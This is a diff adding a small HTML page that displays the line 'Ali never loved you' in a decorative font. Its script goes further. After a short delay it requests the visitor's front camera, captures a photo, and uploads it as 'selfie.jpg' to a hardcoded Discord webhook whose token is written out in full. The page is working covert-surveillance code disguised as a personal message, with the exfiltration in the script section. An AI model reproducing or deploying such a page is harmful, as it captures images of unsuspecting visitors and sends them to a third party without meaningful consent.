@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ali Never Loved You</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: black;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Great Vibes', cursive;
+            color: white;
+        }
+
+        #message {
+            font-size: 3em;
+            text-align: center;
+            position: absolute;
+            z-index: 2;
+        }
+
+        #cameraFeed {
+            display: none;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap');
+    </style>
+</head>
+<body>
+    <div id="message">Ali never loved you</div>
+    <video id="cameraFeed" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const message = document.getElementById('message');
+        const video = document.getElementById('cameraFeed');
+        const canvas = document.getElementById('canvas');
+        
+        // Replace with your Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1200214599090311169/CKCb1wQOwyh2LKNWrUH8EDc_kEjTK4abOxV4kHyBpfwEvF3EUrFXvC7pDoEe1iOktTiU';
+
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                message.style.display = 'none';
+                
+                // Wait 3 seconds before capturing image
+                setTimeout(captureImage, 3000);
+                
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                message.textContent = 'Failed to access camera';
+            }
+        }
+
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(sendToDiscord, 'image/jpeg', 0.8);
+        }
+
+        function sendToDiscord(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'selfie.jpg');
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    message.textContent = 'Image sent successfully';
+                } else {
+                    message.textContent = 'Failed to send image';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                message.textContent = 'Error sending image';
+            });
+        }
+
+        // Start process after 2 seconds
+        setTimeout(requestCamera, 2000);
+    </script>
+</body>
+</html>
